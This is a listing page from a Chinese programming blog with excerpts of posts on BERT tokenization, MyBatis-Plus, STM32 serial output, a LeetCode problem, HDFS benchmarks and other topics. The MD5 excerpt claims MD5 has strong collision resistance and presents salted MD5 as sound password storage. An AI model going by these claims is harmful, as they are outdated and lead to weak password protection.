			<a href="/posts/abcab5fb7c117d8eb38ba79b14ceb950/" rel="bookmark">
			Task05 编写BERT 模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言1 Tokenization分词-BertTokenizer2 Model BertModel2.1 BertEmberddings2.2 BertEncoder2.2.1 BertAttention2.2.1.1 BertSelfAttention2.2.1.2 BertSelfOutput 2.2.3 BertOutput 2.3 BertPooler 总结参考 前言 1 Tokenization分词-BertTokenizer 接下来的代码我感觉太复杂了
import collections import os import unicodedata from typing import List, Optional, Tuple from transformers.tokenization_utils import PreTrainedTokenizer, _is_control, _is_punctuation, _is_whitespace from transformers.utils import logging logger = logging.get_logger(__name__) VOCAB_FILES_NAMES = {"vocab_file": "vocab.txt"} PRETRAINED_VOCAB_FILES_MAP = { "vocab_file": { "bert-base-uncased": "https://huggingface.co/bert-base-uncased/resolve/main/vocab.txt", } } PRETRAINED_POSITIONAL_EMBEDDINGS_SIZES = { "bert-base-uncased": 512, } PRETRAINED_INIT_CONFIGURATION = { "bert-base-uncased": {"do_lower_case": True}, } def load_vocab(vocab_file): "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/abcab5fb7c117d8eb38ba79b14ceb950/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/841fa5de93982dcac54aff91336080cc/" rel="bookmark">
			mybatis-plus详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、简介 MyBatis-Plus 是一个 Mybatis 增强版工具，在 MyBatis 上扩充了其他功能没有改变其基本功能，为了简化开发提交效率而存在。
2、适用情况 1、对于只进行单表操作来说，mybatis-plus代码量比mybatis的代码量少很多，极大的提高了开发效率
2、对于多表操作来说，更推荐mybatis，因为mybatis-plus的方法比较难以理解，用起来不太方便，不如自己写sql语句的逻辑那么清晰明了
3、mybatis-plus前期准备（工程将以 H2 作为默认数据库进行演示） 1、使用 Spring Initializer快速初始化一个 Spring Boot 工程
2、导入mybatis-plus依赖
&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;spring-latest-version&lt;/version&gt; &lt;relativePath/&gt; &lt;/parent&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;Latest Version&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.h2database&lt;/groupId&gt; &lt;artifactId&gt;h2&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 3、yml文件中添加相关配置
# DataSource Config spring: datasource: driver-class-name: org.h2.Driver schema: classpath:db/schema-h2.sql data: classpath:db/data-h2.sql url: jdbc:h2:mem:test username: root password: test 4、在 Spring Boot 启动类中添加 @MapperScan 注解，扫描 Mapper 文件夹
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/841fa5de93982dcac54aff91336080cc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd3a2bccaee3c8cef2ad1fe8765ead55/" rel="bookmark">
			Ubuntu安装配置NFS时出现portmap: No such file or directory
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		依据安装步骤
安装Ubuntu NFS服务 apt-get install nfs-kernel-server 而后配置共享文件目录后，按照步骤需要重启nfs和portmap 在执行 /etc/init.d/portmap restart 时就出现了无法找到这个目录，无法识别 portmap: unrecognized service 此时切换到 /etc/init.d/ 目录下，查看实际安装的软件工具 可以查看到，实际的nfs-kernel-server是安装成功的，但是在这个目录下，并没有看到portmap，是因为rpcbind已经更名取代了portmap，两者是一样的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f20954cc947bb4159c92f637e705f3a/" rel="bookmark">
			LeetCode 213. 打家劫舍 II【c&#43;&#43;/java详细题解】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1、题目2、思路3、c++代码4、java代码 1、题目 你是一个专业的小偷，计划偷窃沿街的房屋，每间房内都藏有一定的现金。这个地方所有的房屋都 围成一圈 ，这意味着第一个房屋和最后一个房屋是紧挨着的。同时，相邻的房屋装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警 。
给定一个代表每个房屋存放金额的非负整数数组，计算你 在不触动警报装置的情况下 ，今晚能够偷窃到的最高金额。
示例 1：
输入：nums = [2,3,2] 输出：3 解释：你不能先偷窃 1 号房屋（金额 = 2），然后偷窃 3 号房屋（金额 = 2）, 因为他们是相邻的。 示例 2：
输入：nums = [1,2,3,1] 输出：4 解释：你可以先偷窃 1 号房屋（金额 = 1），然后偷窃 3 号房屋（金额 = 3）。 偷窃到的最高金额 = 1 + 3 = 4 。 示例 3：
输入：nums = [0] 输出：0 2、思路 给定一个代表金额的非负整数数组nums，相邻房间不可偷并且房间是围成一圈的，让我们输出可以偷窃到的最高金额。
样例：
如样例所示，nums = [1,2,3,1]，偷窃1，3，号房间可以获得最高金额4。
打家劫舍 I
我们先来看看「198. 打家劫舍」房间单排排列的动态规划的做法。
状态表示：f[i]表示偷窃1号到i号房间所能获得的最高金额。那么，f[n]就表示偷窃1号到n号房间所能获得的最高金额，即为答案。
状态计算：
假设有i间房间，考虑最后一间偷还是不偷房间，有两种选择方案：
1、偷窃前i-1间房间，不偷窃最后一间房间，那么问题就转化为了偷窃1号到i- 1号房间所能获得的最高金额，即f[i] = f[i-1]。 2、偷窃前i - 2间房间和最后一间房间 (相邻的房屋不可闯入)，那么问题就转化为了偷窃1号到i- 2号房间所能获得的最高金额再加上偷窃第i号房间的金额，即f[i] = f[i - 2] + nums[i]。 (下标均从1开始) 两种方案，选择其中金额最大的一个。因此状态转移方程为： f[i] = max(f[i - 1], f[i - 2] + nums[i])。 (下标均从1开始)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9f20954cc947bb4159c92f637e705f3a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/810e0ad60efecda54b40e293cc79388e/" rel="bookmark">
			背书神器，手机语音播报，蓝牙遥控器，文字合成语音，语音检索
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		手机APP播音软件，后台按类别录入文章； APP可以左右切换目录，上下切换文章； 暂停、继续播放； 麦克风语音输入检索文章！ 可以把整本书装进APP。
所有的APP操作可通过蓝牙遥控器完成，再配合蓝牙带麦克风小耳机使用。主持人播报，小软件大用途！
后台的文章同步到本地APP后，工作无需网络，文字转语音，检索语音转文字皆在手机本地完成。可以下载手机读APP体验测试，看图。
手机语音播报按键遥控 左右目录 上下文章 语音检索
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/feb0021a3945a20522caf67ed606784d/" rel="bookmark">
			Basler相机Sdk采图的演示例程（C#）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		机器ppm不达标的情况下，往往对视觉的处理速度有变态的要求，为了争取处理时间最短，几十毫秒也要争取。
halcon的接口是通用接口，其速度是比不上相机厂商自己相机配套的SDK的采图速度的。
下面程序运行后，500w的CCD拍图的时间（不算显示时间）达到惊人的32毫秒，如果用halcon接口，最快的我见过是180毫秒。
using Basler.Pylon; using HalconDotNet; using System; using System.Collections.Generic; using System.ComponentModel; using System.Data; using System.Diagnostics; using System.Drawing; using System.Linq; using System.Runtime.InteropServices; using System.Text; using System.Threading; using System.Threading.Tasks; using System.Windows.Forms; namespace WindowsFormsApplication1 { public partial class Form1 : Form { private PixelDataConverter converter = new PixelDataConverter(); /// &lt;summary&gt; /// 相机ID /// &lt;/summary&gt; public string UserID { get { return userID; } } private string userID = string.Empty; private Stopwatch sw = new Stopwatch(); private bool isOkGrab = false; private IntPtr latestFrameAddress = IntPtr.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/feb0021a3945a20522caf67ed606784d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/582fd6c814d829bf241e35baecaa44df/" rel="bookmark">
			Latex公式转化成MathType公式的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Latex公式转化成MathType公式 背景 改投的期刊指定使用MathType公式，但平常使用的公式编辑器是AxMath，故需对公式格式进行转换。在转换过程中，Latex公式形式起到了很好的桥梁作用。本文将讲述一种将Latex公式转换成MathType公式的方法。
使用的软件
AxMath MathType 6.9a Typora 操作流程叙述 在AxMath公式编辑器界面中，将需要转换的公式选中，右键复制TeX脚本(或者采用动作演示中的流程)，粘贴至Typora的文档中，逐一进行，将所有的需要转换的公式汇总一个文档，利于后续工作的展开。将Latex公式代码复制到MathType公式编辑器界面，可自动实现公式的转换。
动作演示 缺点 需要指出的是：对矢量符号斜体加粗，转换结果出现bug，本应为斜体加粗的公式，转换成了正体加粗，需要在MathType公式编辑器内进行微调，将正体转换成斜体。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b24e174713d0d84db24c82e4d9b2c98e/" rel="bookmark">
			5. STM32——串口发送字符、字符串 &#43; printf 的重定向
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		STM32——串口发送字符、字符串 + printf 的重定向 基本框架1. 配置时钟：配置GPIO时钟、窗口时钟、引脚复用时钟2. 配置GPIO结构体在 stm32f10x_gpio.h 头文件中查找相关函数函数 3. 配置串口结构体在 stm32f10x_usart.h 头文件中查找相关函数 4. 串口的发送STM32 串口通信中 USART_FLAG_TC 与 USART_FLAG_TXE 区别在 stm32f10x_usart.h 头文件中查找相关函数 基本框架整合代码usart.cusart.hmain.c 串口发送字符、字符串1. 串口发送字符2. 串口发送字符串串口发送字符、字符串 代码整合usart.cusart.hmain.c printf 的重定向fputcfgetcusart.cusart.hmain.c 基本框架 1. 配置时钟：配置GPIO时钟、窗口时钟、引脚复用时钟 //1.配置时钟 //1.1配置GPIOA、串口时钟、复用时钟 RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA, ENABLE); RCC_APB2PeriphClockCmd(RCC_APB2Periph_USART1, ENABLE); RCC_APB2PeriphClockCmd(RCC_APB2Periph_AFIO, ENABLE); 2. 配置GPIO结构体 在 stm32f10x_gpio.h 头文件中查找相关函数函数 //2.配置GPIOA结构体 GPIO_InitTypeDef gpioInitStructure; //2.1 A9 TX （发送） gpioInitStructure.GPIO_Mode	= GPIO_Mode_AF_PP; //复用推挽输出 gpioInitStructure.GPIO_Pin	= GPIO_Pin_9; gpioInitStructure.GPIO_Speed	= GPIO_Speed_50MHz; GPIO_Init(GPIOA, &amp;gpioInitStructure); //初始化A9 //2.2 A10 RX （接收） gpioInitStructure.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b24e174713d0d84db24c82e4d9b2c98e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1bf9c78be8e51c316e46381eafe5c89/" rel="bookmark">
			单片机专用术语
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C Compiler CERT-
AURIX 缩写全称解释SRIShared Resource InterconnectionECCError correction code错误校正码PMIProgram Memory Interface从PFlash中读出提供指令到CPUSPBSystem Peripheral Bus系统外围总线FSIFlash和SRAM管理器(状态机)HSMHardware Security ModulePMAPhysical Memory Attribute RegistersDSPRData Scratch Pad SRAM数据暂存存储器DMIData Memory Interface数据存储器接口PSPRProgram Scratch Pad RAMLUMLocal Memory UnitTAGbus master identification lines总线主控标示线DCacheData Cache SRAM高速缓冲存储器PMUProgram Memory UniteSRNService Request NodesICUInterrupt Control UnitSRCService Request Control RegisterIRInterrupt RouterGPSRGeneral Purpose Service Request NodesTCNTrap Class NummberTINTrap Identification NumberMPUMemory Protection UnitBCUBus Control UnitACCENAccess Enable RegisterSAR ADCsSuccessive Approximation Register(逐次逼近型寄存器) ADC逐次逼近型ADCSMUSafety Management UnitCCUClocking and Clock Control UnitCAPCOMCapture Compare UnitATOMARU-connected Timer Output ModuleARUAdvanced Routing UnitICMInterrupt Concentrator ModuleISAInstruction Set ArchitectureSIMDSingle Instruction Multiple DataSTMsSoftware Managed TasksCSAsContext Save AreasSRNSService Request NodesDMADirect Memory AccessGPRsGeneral Purpose Registers通用寄存器CDCCore Debug ControllerSSWStartup SoftwareABMAlternate Boot ModesBMIBoot Mode IndexBMHDIDBoot Mode Header ID确认代码（B359)ASCAsynchronous Serial InterfaceCANController Area NetworkBootstrap LoadingBSLEVREmbedded Voltage Regulator嵌入式电压调节器PCProgram Counter register程序计数器寄存器PCPPeripheral Control Processor外围控制处理器VMAVirtral address虚拟地址LMAload address加载地址PSWProgram Status Word Register程序状态字寄存器CSFRCPU Core Special Function Registers内核特殊功能寄存器SoCSystem-on-ChipLDOLinear Drop Out regulator topologySMPSSwitch Mode Power Supply regulator topologyUCBUser Configuration Block in FlashBIVBase Interrupt Vector table/Base Trap Vector tableISPInterrupt Stack PointerESRExternal Serveice RequestsMTUMemory Test UnitMBISTMemory Build In Self TestFPIFlexible Peripheral Interconnect(Bus protocol)OPTOne-Time Programmablethese flash sections be changed anymoreOTGSCentral OCDS Trigger SwitchOCDS Trigger Switch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b1bf9c78be8e51c316e46381eafe5c89/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fba14967f6f5f2dc5a43a4b68fd6239f/" rel="bookmark">
			关于AUTOSAR 系列文章的一点想法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.本人所写的AUTOSAR 系列文章并不适合初学者和资深AUTOSAR专家，如果你能完全看懂AUTOSAR Offical Spec ,可以不用看我写的内容. 很多内容过于抽象需要有一点基础
2.目前完成的50多篇主要介绍的是AUTOSAR 所能实现的功能，很少涉及架构设计，性能优化。后续会增加部分内容（作为AUTOSAR 架构首先要知道AUTOSAR 能做什么， 有多少种方案，性能如何，才能设计出合理的架构）
3.本人所写内容是基于7年AUTOSAR 使用和架构设计经验总结而成，并不是对AUTOSAR Offical Spec的翻译，很多文章都是在这7年间陆陆续续完成的，肯定有不正确的地方
4.由于MCAL 部分过于依赖芯片，因此不打算介绍过多MCAL 部分
5.本人是完全利用私人时间完成所有文档的编写和总结，并不存在薅公司羊毛的现象。 过去的7年虽然身处3线城市， 但是依然坚持（8 ~ 24）*6 的工作状态
6.本人现供职于AUTOSAR 核心成员之一
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/979687d7b2a55f8a6a2ab89f2a665124/" rel="bookmark">
			MD5加密（MD5Util ）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MD5加密（MD5Util ） MD5概述： MD5消息摘要算法，属Hash算法一类。MD5算法对输入任意长度的消息进行运行，产生一个128位的消息摘要(32位的数字字母混合码)。 MD5主要特点: 不可逆，相同数据的MD5值肯定一样，不同数据的MD5值不一样 (一个MD5理论上的确是可能对应无数多个原文的，因为MD5是有限多个的而原文可以是无数多个。比如主流使用的MD5将任意长度的“字节串映射为一个128bit的大整数。也就是一共有2^128种可能，大概是3.4*10^38，这个数字是有限多个的，而但是世界上可以被用来加密的原文则会有无数的可能性) MD5的性质： 1、压缩性：任意长度的数据，算出的MD5值长度都是固定的(相当于超损压缩)。 2、容易计算：从原数据计算出MD5值很容易。 3、抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。 4、弱抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。 5、强抗碰撞：想找到两个不同的数据，使它们具有相同的MD5值，是非常困难的。 虽说MD5有不可逆的特点 但是由于某些MD5破解网站，专门用来查询MD5码，其通过 把常用的密码先MD5处理，并将数据存储起来，然后跟需要查询的MD5结果匹配，这时就有可能通过匹配的MD5得到明文，所以有些简单的MD5码是反查到加密前原文的。 为了让MD5码更加安全，涌现了很多其他方法，如加盐。 盐要足够长足够乱 得到的MD5码就很难查到。 MD5用途： 1.防止被篡改： 1）比如发送一个电子文档，发送前，我先得到MD5的输出结果a。然后在对方收到电子文档后，对方也得到一个MD5的输出结果b。如果a与b一样就代表中途未被篡改。 2）比如我提供文件下载，为了防止不法分子在安装程序中添加木马，我可以在网站上公布由安装文件得到的MD5输出结果。 3）SVN在检测文件是否在CheckOut后被修改过，也是用到了MD5. 2.防止直接看到明文： 现在很多网站在数据库存储用户的密码的时候都是存储用户密码的MD5值。这样就算不法分子得到数据库的用户密码的MD5值，也无法知道用户的密码。（比如在UNIX系统中用户的密码就是以MD5（或其它类似的算法）经加密后存储在文件系统中。当用户登录的时候，系统把用户输入的密码计算成MD5值，然后再去和保存在文件系统中的MD5值进行比较，进而确定输入的密码是否正确。通过这样的步骤，系统在并不知道用户密码的明码的情况下就可以确定用户登录系统的合法性。这不但可以避免用户的密码被具有系统管理员权限的用户知道，而且还在一定程度上增加了密码被破解的难度。） 3.防止抵赖（数字签名）： 这需要一个第三方认证机构。例如A写了一个文件，认证机构对此文件用MD5算法产生摘要信息并做好记录。若以后A说这文件不是他写的，权威机构只需对此文件重新产生摘要信息，然后跟记录在册的摘要信息进行比对，相同的话，就证明是A写的了。这就是所谓的“数字签名”。 package com.example.documentsubmissionsystem.util.MD5Util; import org.springframework.stereotype.Component; import sun.misc.BASE64Encoder; import java.nio.charset.StandardCharsets; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; /** * @author CaoPengCheng * @version 1.0 * @description: MD5加密 * @date 2021/9/17 15:08 */ @Component public class MD5Util { /** * @return String * @author CaoPengCheng * @description: 计算md5的工具方法 * @date 2021/9/17 15:08 * @Param String password */ public static String createMD5(String password) { try { //确定md5加密算法 MessageDigest md = MessageDigest.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/979687d7b2a55f8a6a2ab89f2a665124/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/150c25eddd1156e58d371d8ab10c07f4/" rel="bookmark">
			vue for循环列表（插槽）输入数据操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vue for循环列表（插槽）输入数据操作 1、给循环的每一行的编辑框添加chang事件
输入框：参数（数据的唯一key，绑定的键名，$event.target.value值）
下拉框：参数（数据的唯一key，绑定的键名，$event值）
HTML部分：
&lt;div class="form-box" v-for="(items, index) in fixList" :key="index"&gt; &lt;-- 输入框 --&gt; &lt;span class="label"&gt;收件人：&lt;/span&gt; &lt;a-input placeholder="请输入姓名" v-model="items.receiverName" @change="onCellChange(items.id,'receiverName', $event.target.value)" /&gt; &lt;-- 下拉框 --&gt; &lt;span class="delivery" style="margin-left:80px;display:inline-block"&gt;可用快递： &lt;a-select show-arrow="false" v-model="items.idOExpress" @change="onCellChange(items.deliverTenantId,'idOExpress', $event, index)" &gt; &lt;a-select-option v-for="item in items.delivery" :key="item.idExpress" :value="item.idExpress"&gt; {{item.name}} &lt;/a-select-option&gt; &lt;/a-select&gt; &lt;/span&gt; &lt;div&gt; JS部分：
// 列表插槽数据处理 onCellChange (key, dataIndex, value) { const fixList= [...JSON.parse(JSON.stringify(this.fixList))] // 注意深拷贝 // item.id 第一个参数数据的唯一key const target = fixList.find(item =&gt; item.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/150c25eddd1156e58d371d8ab10c07f4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a76d3292293399f152191a97029ae6f6/" rel="bookmark">
			解决os.path.isdir()判断文件夹为false
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		os.listdir('E:\Python')这样文件夹内文件/夹可以全部显示出来
但是当我想遍历打印所有文件夹我就写了如下代码：
for s in os.listdir('E:\Python'): if os.path.isdir(s): print(s) 这样运行后 发现文件/夹一个也打印不出来
后来经过调整 如下：
for s in os.listdir('E:\Python'): if os.path.isdir('E:\Python\\'+s): print(s) 将os.path.isdir()参数中加了一个根路径即可
原因是listdir只打印出来文件夹名字 凭名字，没有路径无法判断是否为文件夹
所有添加一个路径，完整以后即可判断文件夹
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f53e3ff45fae54c1b667ba33e1fc4f1/" rel="bookmark">
			2021最新对比学习（Contrastive Learning）在各大顶会上的经典必读论文解读
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我为大家整理了对比学习在最新各大顶会上的论文合集及相应代码，所列举的论文涉及领域包括但不限于CV, NLP, Audio, Video, Multimodal, Graph, Language model等，GitHub地址：
https://github.com/coder-duibai/Contrastive-Learning-Papers-Codes
（请大家多多点赞支持ヽ(✿ﾟ▽ﾟ)ノ，笔芯！）
大家好，我是对白。
由于最近对比学习实在太火了，在ICLR2020上深度学习三巨头 Bengio 、 LeCun和Hinton就一致认定自监督学习(Self-Supervised Learning)是AI的未来，此外，在各大互联网公司中的业务落地也越来越多，且效果还非常不错（公司里亲身实践），于是写了两篇有关对比学习的文章：
一篇是对比学习在CV与NLP领域中的研究进展，写得比较系统与全面，里面介绍了对比学习是什么，以及该技术如何应用在各个领域中，包括MoCo、SimCLR、BYOL、SwAV、SimCSE等；
另一篇则梳理了ICLR2021上对比学习在NLP领域六大方向中的应用，均收获了很多小伙伴们的私信，感兴趣的同学也可以看一看：
1.对比学习（Contrastive Learning）在CV与NLP领域中的研究进展
2.ICLR2021对比学习（Contrastive Learning）NLP领域论文进展梳理
本篇文章则梳理了对比学习在ICLR2021、ICLR2020和NIPS2020中非常值得大家一读的一些经典论文，构思非常巧妙，涵盖了CV和NLP领域，且与之前两篇文章中介绍的模型均不重叠。后续等NIPS2021论文公开后，也会持续更新并分享给大家，话不多说，开始进入正题叭。
对比学习（ICLR2021/2020）
值得一读的八篇论文
1.PCL
论文标题：Prototypical Contrastive Learning of Unsupervised Representations
论文方向：图像领域，提出原型对比学习，效果远超MoCo和SimCLR
论文来源：ICLR2021
论文链接：https://arxiv.org/abs/2005.04966
论文代码：https://github.com/salesforce/PCL
作者提出了原型对比学习（PCL），它是无监督表示学习的一种新方法，综合了对比学习和聚类学习的优点。
在 PCL 中，作者引入了一个「原型」作为由相似图像形成的簇的质心。将每个图像分配给不同粒度的多个原型。训练的目标是使每个图像嵌入更接近其相关原型，这是通过最小化一个 ProtoNCE 损失函数来实现的。
在高层次上，PCL 的目标是找到给定观测图像的最大似然估计(MLE)模型参数：
作者引入原型 c 作为与观测数据相关的潜在变量，提出了一种EM算法来求解最大似然估计。在 E-step 中，通过执行 K 平均算法估计原型的概率。在M步中，通过训练模型来最大化似然估计，从而最小化一个 ProtoNCE 损失:
在期望最大化框架下，作者证明以前的对比学习方法是 PCL 的一个特例。
此外，作者在少样本迁移学习、半监督学习和目标检测三个任务上对 PCL 进行评估，在所有情况下都达到了SOTA的性能。
作者希望 PCL 可以扩展到视频，文本，语音等领域，让 PCL 激励更多有前途的非监督式学习领域的研究，推动未来人工智能的发展，使人工标注不再是模型训练的必要组成部分。
2.BalFeat
论文标题：Exploring Balanced Feature Spaces for Representation Learning
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3f53e3ff45fae54c1b667ba33e1fc4f1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1e7c87bff67da38acec188ece13de3e1/" rel="bookmark">
			7.数仓项目经验—基准测试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目经验之基准测试 1. 测试HDFS写性能 测试内容：
向HDFS集群写10个128M的文件。 hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-client-jobclient-3.1.3-tests.jar TestDFSIO -write -nrFiles 10 -fileSize 128MB 注意：
nrFiles n为生成mapTask的数量，生产环境一般可通过8088端口查看cpu核数，设置为cpu核数-1 测试结果：
2020-04-16 13:41:24,724 INFO fs.TestDFSIO: ----- TestDFSIO ----- : write 2020-04-16 13:41:24,724 INFO fs.TestDFSIO: Date &amp; time: Thu Apr 16 13:41:24 CST 2020 2020-04-16 13:41:24,724 INFO fs.TestDFSIO: Number of files: 10 2020-04-16 13:41:24,725 INFO fs.TestDFSIO: Total MBytes processed: 1280 2020-04-16 13:41:24,725 INFO fs.TestDFSIO: Throughput mb/sec: 8.88 2020-04-16 13:41:24,725 INFO fs.TestDFSIO: Average IO rate mb/sec: 8.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1e7c87bff67da38acec188ece13de3e1/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/282/">«</a>
	<span class="pagination__item pagination__item--current">283/489</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/284/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>